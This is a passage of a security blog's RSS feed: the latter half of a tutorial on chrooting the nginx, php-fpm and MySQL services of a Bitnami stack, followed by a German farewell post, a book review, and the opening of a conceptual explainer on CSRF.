</code></pre></div><p>I&rsquo;ve set the <code>LD_LIBRARY_PATH</code> manually since not all libs are located at <code>/lib/*</code>.</p>
<h3 id="patch-php-fpm-control-script">Patch php-fpm control script</h3>
<p>Despite some previous approaches this turned out to be a very simple step. All you&rsquo;ll have to do is to add following lines to your <code>php-fpm.conf</code> insde <code>/home/bitnami/nginxstack/php/etc/php-fpm.conf</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#40ffff">chroot</span> = /home/bitnami/nginxstack-chroot
<span style="color:#40ffff">chdir</span> = /
</code></pre></div><p>This will put the <code>php-fpm</code> workers into <code>/home/bitnami/nginxstack-chroot</code>. However, you may want to restrict that a little bit more and &ldquo;jail&rdquo; <code>php-fpm</code> to <code>/home/bitnami/nginxstack/apps/yourapp</code>. I&rsquo;ll come back to this point in a sec.</p>
<h3 id="patch-mysql-control-script">Patch mysql control script</h3>
<p>Patching the <code>mysql</code> control scripts seemed to be a never-ending story. Till I&rsquo;ve found <code>--chroot</code>:</p>
<blockquote>
<p>&ldquo;Put the mysqld server in a closed environment during startup by using the chroot() system call.&rdquo; (Source: <a href="http://dev.mysql.com/doc/refman/5.7/en/server-options.html">http://dev.mysql.com/doc/refman/5.7/en/server-options.html</a>)</p>
</blockquote>
<p>Bingo! At <code>/home/bitnami/nginxstack/mysql/scripts/ctl.sh</code> you&rsquo;ll have sth like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#cd2828;font-weight:bold">#!/bin/sh
</span><span style="color:#cd2828;font-weight:bold"></span>
<span style="color:#40ffff">MYSQL_PIDFILE</span>=/home/bitnami/nginxstack/mysql/data/mysqld.pid

<span style="color:#40ffff">MYSQL_START</span>=<span style="color:#ed9d13">&#34;/home/bitnami/nginxstack/mysql/bin/mysqld_safe --defaults-file=/home/bitnami/nginxstack/mysql/my.cnf --socket=/home/bitnami/nginxstack/mysql/tmp/mysql.sock  --datadir=/home/bitnami/nginxstack/mysql/data --log-error=/home/bitnami/nginxstack/mysql/data/mysqld.log  --pid-file=</span><span style="color:#40ffff">$MYSQL_PIDFILE</span><span style="color:#ed9d13"> --lower-case-table-names=1 &#34;</span>

[...]
</code></pre></div><p>And now just add the <code>--chroot</code> option and you&rsquo;re done:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#cd2828;font-weight:bold">#!/bin/sh
</span><span style="color:#cd2828;font-weight:bold"></span>
<span style="color:#40ffff">MYSQL_PIDFILE</span>=/home/bitnami/nginxstack/mysql/data/mysqld.pid

<span style="color:#40ffff">MYSQL_START</span>=<span style="color:#ed9d13">&#34;/home/bitnami/nginxstack/mysql/bin/mysqld_safe --defaults-file=/home/bitnami/nginxstack/mysql/my.cnf --socket=/home/bitnami/nginxstack/mysql/tmp/mysql.sock  --datadir=/home/bitnami/nginxstack/mysql/data --log-error=/home/bitnami/nginxstack/mysql/data/mysqld.log  --pid-file=</span><span style="color:#40ffff">$MYSQL_PIDFILE</span><span style="color:#ed9d13"> --lower-case-table-names=1 --chroot=</span><span style="color:#40ffff">$JAIL</span><span style="color:#ed9d13">&#34;</span>

[...]
</code></pre></div><h2 id="check-setup">Check setup</h2>
<p>Now that we have modified the scripts let&rsquo;s have a dry run.</p>
<h3 id="nginx">nginx</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root:/home/bitnami/nginxstack-chroot# ./home/bitnami/nginxstack/nginx/scripts/ctl.sh status
Nginx not running
root:/home/bitnami/nginxstack-chroot# ./home/bitnami/nginxstack/nginx/scripts/ctl.sh start 
./home/bitnami/nginxstack/nginx/scripts/ctl.sh : Nginx started
root:/home/bitnami/nginxstack-chroot# ./home/bitnami/nginxstack/nginx/scripts/ctl.sh status
Nginx already running
root@nusec:/home/bitnami/nginxstack-chroot# netstat -ptan | grep <span style="color:#3677a9">8080</span>
tcp        <span style="color:#3677a9">0</span>      <span style="color:#3677a9">0</span> 0.0.0.0:8080            0.0.0.0:*               LISTEN      22706/          
root:/home/bitnami/nginxstack-chroot# ls -l /proc/22706/root
lrwxrwxrwx <span style="color:#3677a9">1</span> root root <span style="color:#3677a9">0</span> Feb  <span style="color:#3677a9">8</span> 21:07 /proc/22706/root -&gt; /home/bitnami/nginxstack-chroot
</code></pre></div><p>So there is a nginx instance (PID = <code>22706</code>) and this is running in a <code>chroot</code> (/home/bitnami/nginxstack-chroot). Alright!</p>
<h3 id="php-fpm">php-fpm</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root:/home/bitnami/nginxstack-chroot# ./home/bitnami/nginxstack/php/scripts/ctl.sh start
./home/bitnami/nginxstack/php/scripts/ctl.sh : php-fpm started
root:/home/bitnami/nginxstack-chroot# ps -ax | grep php-fpm
                                         <span style="color:#3677a9">1</span>
<span style="color:#3677a9">15134</span> ?        Ss     0:06 php-fpm: master process (/home/bitnami/nginxstack/php/etc/php-fpm.conf)                        
<span style="color:#3677a9">26557</span> ?        Ss     0:00 php-fpm: master process (/home/bitnami/nginxstack/php/etc/php-fpm.conf)                                                         
<span style="color:#3677a9">26560</span> pts/0    S+     0:00 grep php-fpm
root:/home/bitnami/nginxstack-chroot# ls -l /proc/15134/root
lrwxrwxrwx <span style="color:#3677a9">1</span> root root <span style="color:#3677a9">0</span> Feb  <span style="color:#3677a9">8</span> 21:07 /proc/15134/root -&gt; /home/bitnami/nginxstack-chroot
</code></pre></div><h3 id="mysql">mysql</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">root:/home/bitnami/nginxstack-chroot/home/bitnami/nginxstack# ./mysql/scripts/ctl.sh start
160209 16:36:46 mysqld_safe Logging to &#39;/home/bitnami/nginxstack/mysql/data/mysqld.log&#39;.
160209 16:36:47 mysqld_safe Starting mysqld.bin daemon with databases from /home/bitnami/nginxstack/mysql/data
./mysql/scripts/ctl.sh : mysql  started at port 3307


root:/home/bitnami/nginxstack-chroot/home/bitnami/nginxstack# ps -ax | grep mysql
13975 pts/3    S      0:00 /bin/sh /home/bitnami/nginxstack-chroot//home/bitnami/nginxstack/mysql/bin/mysqld_safe --defaults-file=/home/bitnami/nginxstack/mysql/my.cnf --socket=/home/bitnami/nginxstack/mysql/tmp/mysql.sock --datadir=/home/bitnami/nginxstack/mysql/data --log-error=/home/bitnami/nginxstack/mysql/data/mysqld.log --pid-file=/home/bitnami/nginxstack/mysql/data/mysqld.pid --lower-case-table-names=1
14236 pts/3    S      0:00 sh -c LD_LIBRARY_PATH=/home/bitnami/nginxstack/mysql/lib nohup /home/bitnami/nginxstack/mysql/bin/mysqld.bin --defaults-file=/home/bitnami/nginxstack/mysql/my.cnf --basedir=/home/bitnami/nginxstack/mysql --datadir=/home/bitnami/nginxstack/mysql/data --plugin-dir=/home/bitnami/nginxstack/mysql/lib/plugin --user=mysql  --lower-case-table-names=1 --log-error=/home/bitnami/nginxstack/mysql/data/mysqld.log --pid-file=/home/bitnami/nginxstack/mysql/data/mysqld.pid --socket=/home/bitnami/nginxstack/mysql/tmp/mysql.sock --port=3307
14237 pts/3    Sl     0:00 /home/bitnami/nginxstack/mysql/bin/mysqld.bin --defaults-file=/home/bitnami/nginxstack/mysql/my.cnf --basedir=/home/bitnami/nginxstack/mysql --datadir=/home/bitnami/nginxstack/mysql/data --plugin-dir=/home/bitnami/nginxstack/mysql/lib/plugin --user=mysql --lower-case-table-names=1 --log-error=/home/bitnami/nginxstack/mysql/data/mysqld.log --pid-file=/home/bitnami/nginxstack/mysql/data/mysqld.pid --socket=/home/bitnami/nginxstack/mysql/tmp/mysql.sock --port=3307
14258 pts/3    S+     0:00 grep mysql

root:/home/bitnami/nginxstack-chroot/home/bitnami/nginxstack# ls -l /proc/14237/root
lrwxrwxrwx 1 root root 0 Feb  9 16:37 /proc/14237/root -&gt; /home/bitnami/nginxstack-chroot
</code></pre></div><h2 id="run-the-nginx-stack">Run the nginx stack</h2>
<p>Now that everything seems to work fine, let&rsquo;s start all services using Bitnamis <code>ctlscript.sh</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root:/home/bitnami/nginxstack-chroot/home/bitnami/nginxstack# ./ctlscript.sh start
<span style="color:#3677a9">160209</span> 12:59:50 mysqld_safe Logging to <span style="color:#ed9d13">&#39;/home/bitnami/nginxstack/mysql/data/mysqld.log&#39;</span>.
<span style="color:#3677a9">160209</span> 12:59:50 mysqld_safe Starting mysqld.bin daemon with databases from /home/bitnami/nginxstack/mysql/data
/home/bitnami/nginxstack/mysql/scripts/ctl.sh : mysql  started at port <span style="color:#3677a9">3307</span>
/home/bitnami/nginxstack/php/scripts/ctl.sh : php-fpm started
/home/bitnami/nginxstack/nginx/scripts/ctl.sh : Nginx started
</code></pre></div><p>Great! Now let&rsquo;s stop the services:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">/home/bitnami/nginxstack/nginx/scripts/ctl.sh : Nginx stopped
/home/bitnami/nginxstack/php/scripts/ctl.sh : php-fpm stopped
<span style="color:#3677a9">160209</span> 13:01:21 mysqld_safe mysqld from pid file /home/bitnami/nginxstack/mysql/data/mysqld.pid ended
/home/bitnami/nginxstack/mysql/scripts/ctl.sh : mysql stopped
</code></pre></div><h3 id="check-uid-and-gid">Check UID and GID</h3>
<p>To make sure that the previously launched services are dropping privileges (as they are supposed to!) let&rsquo;s have a look at the running processes:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ps -eo uid,gid,args | grep nginx
<span style="color:#3677a9">1337</span>  <span style="color:#3677a9">1337</span> nginx: worker process                              
<span style="color:#3677a9">1337</span>  <span style="color:#3677a9">1337</span> nginx: worker process                              
<span style="color:#3677a9">1337</span>  <span style="color:#3677a9">1337</span> nginx: worker process                              
<span style="color:#3677a9">1337</span>  <span style="color:#3677a9">1337</span> nginx: worker process                              
   <span style="color:#3677a9">0</span>     <span style="color:#3677a9">0</span> nginx: master process /home/bitnami/nginxstack/nginx/sbin/.nginx.bin -p /home/bitnami/nginxstack/nginx/
<span style="color:#3677a9">1337</span>  <span style="color:#3677a9">1337</span> nginx: worker process
</code></pre></div><p>You can see that there is a <strong>master</strong> process running with <code>0:0</code> (UID:GID) but the <strong>worker processes</strong> are running as <code>1337:1337</code> (daemon:daemon). Let&rsquo;s verify that for <code>php</code> and <code>mysql</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ ps -eo uid,gid,args | grep php
1337  1337 php-fpm: pool www                                                     
1337  1337 php-fpm: pool www                                                     
1337  1337 php-fpm: pool www                                                     
1337  1337 php-fpm: pool www 
   0     0 php-fpm: master process (/home/bitnami/nginxstack/php/etc/php-fpm.conf)                        
   
$ ps -eo uid,gid,args | grep mysql
 0     0 /bin/sh /home/bitnami/nginxstack-chroot//home/bitnami/nginxstack/mysql/bin/mysqld_safe --defaults-file=/home/bitnami/nginxstack/mysql/my.cnf --socket=/home/bitnami/nginxstack/mysql/tmp/mysql.sock --datadir=/home/bitnami/nginxstack/mysql/data --log-error=/home/bitnami/nginxstack/mysql/data/mysqld.log --pid-file=/home/bitnami/nginxstack/mysql/data/mysqld.pid --lower-case-table-names=1
 0     0 sh -c LD_LIBRARY_PATH=/home/bitnami/nginxstack/mysql/lib\:/home/bitnami/nginxstack/sqlite/lib\:/home/bitnami/nginxstack/nginx/lib\:/home/bitnami/nginxstack/mysql/lib\:/home/bitnami/nginxstack/common/lib\: nohup /home/bitnami/nginxstack/mysql/bin/mysqld.bin --defaults-file=/home/bitnami/nginxstack/mysql/my.cnf --basedir=/home/bitnami/nginxstack/mysql --datadir=/home/bitnami/nginxstack/mysql/data --plugin-dir=/home/bitnami/nginxstack/mysql/lib/plugin --user=mysql  --lower-case-table-names=1 --log-error=/home/bitnami/nginxstack/mysql/data/mysqld.log --pid-file=/home/bitnami/nginxstack/mysql/data/mysqld.pid --socket=/home/bitnami/nginxstack/mysql/tmp/mysql.sock --port=3307
100   101 /home/bitnami/nginxstack/mysql/bin/mysqld.bin --defaults-file=/home/bitnami/nginxstack/mysql/my.cnf --basedir=/home/bitnami/nginxstack/mysql --datadir=/home/bitnami/nginxstack/mysql/data --plugin-dir=/home/bitnami/nginxstack/mysql/lib/plugin --user=mysql --lower-case-table-names=1 --log-error=/home/bitnami/nginxstack/mysql/data/mysqld.log --pid-file=/home/bitnami/nginxstack/mysql/data/mysqld.pid --socket=/home/bitnami/nginxstack/mysql/tmp/mysql.sock --port=3307
</code></pre></div><h2 id="extras">Extras</h2>
<p>In this section I&rsquo;ll try to sum up some &ldquo;best practices&rdquo; I&rsquo;ve experienced while setting up the (web) application inside the bitnami nginxstack chrooted environment.</p>
<h3 id="check-uidgid">Check UID/GID</h3>
<p>Inside the chroot <code>/etc/passwd</code> should have:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">aemon:x:1:1:daemon:/:/bin/false
mysql:x:100:101:MySQL Server,,,:/nonexistent:/bin/false
nobody:x:99:99:nobody:/:/bin/false
</code></pre></div><p>When setting the user/group ownerships for your directories, make sure that you&rsquo;re using the same UID/GID for that specific user/group also outside the chroot. What I mean is: If you set the ownerships like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ chown -R daemon.daemon php nginx apps
$ chown -R mysql.mysql mysql
</code></pre></div><p>Make sure that the UID/GID for user/group <code>daemon</code> or <code>mysql</code> are the same as in <code>/etc/passwd</code> (outside the chroot). In my case:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ cat /etc/passwd  | grep -e mysql -e daemon
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
mysql:x:100:101:MySQL Server,,,:/nonexistent:/bin/false
</code></pre></div><p>If you don&rsquo;t pay attention to this, you might be setting ownserships and permissions to the right user/group, but the UID/GID might differ between the chroot and the operating system.</p>
<h3 id="applying-ld_library_path-globally">Applying LD_LIBRARY_PATH globally</h3>
<p>If some of your web applications are using some extra binaries (<code>/usr/bin/git</code> for example), you may have to install the dependent libraries for this binary like we did before using <code>n2chroot</code>. If <code>git</code> has some dependencies, that are already installed inside the chroot (let&rsquo;s say inside <code>/home/bitnami/nginxstack/common/lib</code>) you can set the <code>LD_LIBRARY_PATH</code> variable globally. Inside the chroot, you&rsquo;ll have <code>/etc/ld.so.conf</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ cat /etc/ld.so.conf
include /etc/ld.so.conf.d/*.conf
</code></pre></div><p>Now create an extra directory and a new conf file:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ mkdir /etc/ld.so.conf.d
$ cat /etc/ld.so.conf.d/local.conf
/home/bitnami/nginxstack/common/lib/
</code></pre></div><p>Now you&rsquo;ll have to re-create the LD cache by running <code>ldconfig</code> inside the chroot:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ cp /sbin/ldconfig <span style="color:#40ffff">$JAIL</span>/sbin/
$ cp /sbin/ldconfig.real <span style="color:#40ffff">$JAIL</span>/sbin/
$ chroot <span style="color:#40ffff">$JAIL</span> /bin/sh
<span style="color:#999;font-style:italic"># /sbin/ldconfig</span>
...
</code></pre></div><p>Now you should be running <code>git</code> without any missing dependencies inside your chroot.</p>
<h3 id="run-own-php-fpm-pool-for-each-vhost">Run own php-fpm pool for each vhost</h3>
<p>In some previous thoughts I&rsquo;ve mentioned that you may want to put <code>php-fpm</code> in &ldquo;jail&rdquo; into some more specific than <code>/home/bitnami/nginxstack</code>. For example if you have a vhost at <code>bla.example.com</code> and the according conf/htdocs file structure is located at <code>/home/bitnami/nginxstack/apps/bla.example.com</code> you can <code>chroot</code> php-fpm into the same location.</p>
<blockquote>
<p>Btw: The <a href="https://wiki.bitnami.com/Infrastructure_Stacks/Bitnami_Nginx_Stack#How_can_I_create_a_custom_PHP_application.3f">bitnami documentation</a> regarding custom PHP applications  is awesome!</p>
</blockquote>
<p>Let&rsquo;s say <code>bla.example.com</code> consists of following directory structure:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ tree /home/bitnami/nginxstack/apps/bla.example.com
bla.example.com
|-- conf
|   |-- nginx-app.conf
|   |-- nginx-prefix.conf
|   <span style="color:#ed9d13">`</span>-- nginx-vhosts.conf
<span style="color:#ed9d13">`</span>-- htdocs
    |-- index.php
</code></pre></div><p>The <em>app</em> configuration will look like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ cat /home/bitnami/nginxstack/apps/bla.example.com/conf/nginx-app.conf
    index index.php index.html index.htm;

    location ~ <span style="color:#ed9d13">\.</span>php$ {
        fastcgi_split_path_info ^(.+<span style="color:#ed9d13">\.</span>php)(/.+)$;
        fastcgi_read_timeout 300;
        fastcgi_pass unix:/home/bitnami/nginxstack/php/var/run/www-bla.sock;
        fastcgi_index index.php;
        fastcgi_param SCRIPT_FILENAME <span style="color:#40ffff">$fastcgi_script_name</span>;
        include fastcgi_params;
    }
    
    location ~* <span style="color:#ed9d13">\.</span>(js|css|png|jpg|jpeg|gif|ico)$ {
        add_header Vary <span style="color:#ed9d13">&#34;Accept-Encoding&#34;</span>;
        expires max;
        tcp_nodelay off;
        tcp_nopush on;
    }

</code></pre></div><p>The <code>fastcgi_param SCRIPT_FILENAME $fastcgi_script_name;</code> is the most important one. Read <a href="http://serverfault.com/questions/463674/a-complicated-nginx-php-fpm-chroot-setup">here</a> and <a href="http://serverfault.com/questions/356081/chrooting-php-fpm-with-nginx">here</a>.</p>
<p>Now let&rsquo;s create the <code>php-fpm</code> pool for this specific vhost. Usually each pool conf has be created under <code>./php/etc/fpm.d/*.conf</code>. Make sure you have created this directory before and you have following in your <code>./php/etc/php-fpm.conf</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">[...]
<span style="color:#40ffff">include</span>=etc/fpm.d/*.conf
[...]
</code></pre></div><p>Now create a new file (<code>./php/etc/fpm.d/www-bla.conf</code>) and add:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">;;;;;;;;;;;;;;;;;;;;
; Pool Definitions ; 
;;;;;;;;;;;;;;;;;;;;
[www-bla]
<span style="color:#40ffff">include</span>=/home/bitnami/nginxstack/php/etc/environment.conf
<span style="color:#40ffff">include</span>=/home/bitnami/nginxstack/php/etc/common.conf
<span style="color:#40ffff">user</span>=daemon
<span style="color:#40ffff">group</span>=daemon
<span style="color:#40ffff">listen</span>=/home/bitnami/nginxstack/php/var/run/www-bla.sock
<span style="color:#40ffff">pm</span>=dynamic
pm.max_children=<span style="color:#3677a9">5</span>
pm.start_servers=<span style="color:#3677a9">2</span>
pm.min_spare_servers=<span style="color:#3677a9">1</span>
pm.max_spare_servers=<span style="color:#3677a9">3</span>
<span style="color:#40ffff">chroot</span> = /home/bitnami/nginxstack-chroot/apps/bla.example.com/htdocs
<span style="color:#40ffff">chdir</span> = /
</code></pre></div><p>You can of course add some more options. But this is the minimum one should have. Now you&rsquo;ll have to <strong>restart</strong> the <code>php-fpm</code> daemon and you should see some <strong>workers</strong> designated for your specific vhost:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ./ctlscript.sh restart php-fpm
$ ps -ax | grep php-fpm
<span style="color:#3677a9">2735</span> ?        Ss     0:01 php-fpm: master process (/home/bitnami/nginxstack/php/etc/php-fpm.conf)                                  
 <span style="color:#3677a9">2736</span> ?        S      0:00 php-fpm: pool www-bla                                                               
 <span style="color:#3677a9">2737</span> ?        S      0:00 php-fpm: pool www-bla
</code></pre></div><p>Let&rsquo;s check the <code>root</code> directory of the workers:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ls -l /proc/2736/root
lrwxrwxrwx <span style="color:#3677a9">1</span> daemon daemon <span style="color:#3677a9">0</span> Feb <span style="color:#3677a9">12</span> 11:23 /proc/2736/root -&gt; /home/bitnami/nginxstack-chroot/home/bitnami/nginxstack/apps/bla.example.com/htdocs
</code></pre></div><p>Voila!</p>
<h2 id="conclusion">Conclusion</h2>
<p>The Bitnami nginx stack is a really easy-to-configure bundle one can either use in a dev or productive environment. Applying additional security measurements to it like <code>chroot</code> will help you to mitigate the impact of a potential attack. Again: <strong>chroot != security</strong>. Don&rsquo;t blindly rely on <code>chroot</code> and make sure you deeply understand how this technology works and what its potential risks could damage your business.</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Bye bye VODKA!</title>
      <link>https://blog.dornea.nu/2016/02/01/bye-bye-vodka/</link>
      <pubDate>Mon, 01 Feb 2016 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2016/02/01/bye-bye-vodka/</guid>
      <content:encoded><![CDATA[<p>Nach mehr als 3 Jahren habe ich mich dazu entschloÃŸen, <strong>VODKA</strong> zu verlassen. Angefangen bei <a href="http://www.kabeldeutschland.de">Kabel Deutschland</a> hat mich die Reise im Zuge einer Ãœbernahme zu <a href="http:///vodafone.de">Vodafone</a> gefÃ¼hrt. Der Begriff <strong>VODKA</strong> selbst (<strong>VOD</strong>afone + <strong>KA</strong>bel) bedeutete fÃ¼r mich nicht nur das ZusammenfÃ¼hren von <strong>zwei</strong> MentalitÃ¤ten (eigentlich sind es jetzt 3 wenn man <a href="http://arcor.de">Arcor</a> dazu zÃ¤hlt) sondern auch eine gelungene Zusammenarbeit zwischen <em>Rot</em> (Vodafone) und <em>Gelb</em> (Kabel Deutschland). Als <a href="http://blog.dornea.nu/tag/appsec">AppSec</a>-Spezialist hatte ich das VergnÃ¼gen, verschiedene Kabel- als auch Vodafone-Produkte unter die Lupe zu nehmen und mit zur Unternehmssicherheit beizutragen.</p>
<p>Ein Kollege (Danke Andreas S. fÃ¼r das Zitat!) hat mir geschrieben:</p>
<blockquote>
<p>&ldquo;Â» Ce qui fait la vie digne d&rsquo;Ãªtre vÃ©cue, ce sont les rencontres avec les hommes. Â»
(frei nach Guy de Maupassant: Es sind die Begegnungen mit Menschen, die das Leben lebenswert machen.)&rdquo;</p>
</blockquote>
<p>Und es sind tatsÃ¤chlich die Menschen, die ich am meisten vermissen werde. Ich danke all den Kollegen, die vielleicht diesen Blog-Post gerade lesen, fÃ¼r die tolle Zeit bei <strong>VODKA</strong> und die Errungenschaften, die wir <strong>gemeinsam</strong> erzielt haben. Ich wÃ¼nsche mir, dass sich unsere Wege demnÃ¤chst wieder kreuzen und bis dahin alles Gute!</p>
<p>Unten ist meine <strong>Abschiedsmail</strong> zu lesen, die ich an die Kollegen verfasst hatte:</p>
<blockquote>
<p>&ldquo;3 Jahre, 1 Monat und 24 Tage spÃ¤ter&hellip;</p>
<p>Vieles ist passiert, Einiges hat sich geÃ¤ndert. Mit groÃŸer Freude habe ich vor 3 Jahren hier angefangen und mich darauf gefreut, endlich ins Berufsleben einzusteigen. Das erste VorstellungsgesprÃ¤ch mit Steve war eher entspannt, wogegen ich nach dem 2. GesprÃ¤ch in UnterfÃ¶hring erstmal einen VODKA gebraucht habe :) (kein Scherz!)</p>
<p>Im Laufe der letzten 3 Jahre habe ich die Kollegen bei KS, KSDS, RU und TXS zu schÃ¤tzen gelernt und jede Menge fÃ¼r die Zukunft mitgenommen. Ich danke vor allem fÃ¼r die wirklich tolle Zusammenarbeit bei den verschiedensten Projekten, die manchmal anspruchsvoll aber auch interessant waren. Auch die verschiedenen AktivitÃ¤ten und AusflÃ¼ge werde ich nicht vergessen (das Oktoberfest 2013 sowieso nicht :D) und mich ein Leben lang mit Freude daran erinnern.</p>
<p>Ich bin auch stolz darauf, zusammen mit Steve, das Thema AppSec wirklich nach vorne gebracht zu haben und inzwischen fÃ¼r die nÃ¶tige Awareness bei den FB gesorgt zu haben. Ich finde, wir haben bei AppSec Einiges auf die Beine gestellt und hoffe, dass unsere Arbeit (in welcher Form auch immer) fortgesetzt wird. Das Thema wird weiterhin wichtig und ein beliebtes Ziel fÃ¼r Angreifer bleiben.</p>
<p>Ich verlasse VODKA mit einem trÃ¤nenden Auge und mit sehr viele schÃ¶nen Erinnerungen, sei es in der &ldquo;Dicken Sophie&rdquo;, bei dem Freitagsritual in der Cantina oder in Berlin beim &ldquo;Italiener 1&rdquo;. Ich hoffe man sieht sich wieder, denn die Security-Community ist klein :) In diesem Sinne wÃ¼nsche ich euch allen ein erfolgreiches Jahr und noch eine schÃ¶ne Zeit bei VODKA!</p>
<p>Bis bald und bis dahin happy hacking!&rdquo;</p>
</blockquote>
]]></content:encoded>
    </item>
    
    <item>
      <title>Steve Jobs by Walter Isaacson</title>
      <link>https://blog.dornea.nu/2016/02/01/steve-jobs-by-walter-isaacson/</link>
      <pubDate>Mon, 01 Feb 2016 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2016/02/01/steve-jobs-by-walter-isaacson/</guid>
      <content:encoded><![CDATA[<p><img src="/posts/img/2016/d704a2159c59405830720a21211a90e6.jpg" alt="Steve Jobs"></p>
<p>From time to time I like to read about great personalities and how their handling and decisions
changed the world. I&rsquo;m not an Apple fan and I do have something against Apple&rsquo;s closed platform
approach. I also don&rsquo;t obsessively admire Mr. Jobs and its products, but this book gives you a
very good impression how it feeled to work <em>with</em> and <em>for</em> Steve Jobs. Although this is the only
book I&rsquo;ve read about him, I think Mr. Jobs had a really huge impact on what we define nowadays
a <em>well designed product</em>. I also admire his intention to combine arts and technology and give
people the right tools to express their creativity. I highly recommend this book for those who
want to learn more about <strong>how this whole PC thing</strong> started and why Microsoft and Xerox have missed
the chance to revolutionize the world.</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Some words on CSRF and cookies</title>
      <link>https://blog.dornea.nu/2016/01/26/some-words-on-csrf-and-cookies/</link>
      <pubDate>Tue, 26 Jan 2016 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2016/01/26/some-words-on-csrf-and-cookies/</guid>
      <content:encoded><![CDATA[<p>Being involved in different projects where web technologies are used, I have to make sure that <a href="http://blog.dornea.nu/tag/appsec/">AppSec</a> related security nightmares
are avoided. One of those security nightmare - and in my own oppinion the most complicated one to explain to a <strong>non-sec</strong> person - is <a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet">CSRF</a>. I won&rsquo;t go into details since these are freely available. Furthermore I would like to focus on the <strong>countermeasures</strong> one would implement to prevent CSRF. In some cases it&rsquo;s suggested to think of some attack scenarios before relying on the implemented solution. But first let&rsquo;s have a look how a typical CSRF attack works like.</p>
<h2 id="general-idea">General idea</h2>
<p>Usually we have 3 components involved:</p>
<details>
  <summary style="background-color:#f5f5f5;border:1px solid #ccc;padding:5px;">
    blockdiag code
    
  </summary>
  <pre><code>seqdiag {
    Attacker;
    Client [label=&quot;Client/Browser&quot;];
    Server;
}
</code></pre>

</details>

<p><img src="/posts/img/2016/some-words-on-csrf-and-cookies/xx01.png" alt=""></p>
<p>The <strong>client/browser</strong> communicates with the <strong>server</strong> and the <strong>attacker</strong> will try to <em>lure</em> the user to some previously <strong>prepared site</strong>. This can happen by sending
<strong>mails</strong> with some malicious link or injecting content into a site the user is visiting (e.g. using <strong>iframes</strong>). This way the attack will cause the client/browser
to fire requests to the server <strong>without</strong> any user interaction. The user behing the client/browser won&rsquo;t notice anything since this will happen in the background by just visiting the site and/or triggering some JavaScript to execute.</p>
<details>
  <summary style="background-color:#f5f5f5;border:1px solid #ccc;padding:5px;">
    blockdiag code
    
  </summary>
  <pre><code>seqdiag {
    Attacker;
    Client [label=&quot;Client/Browser&quot;];
    Server;
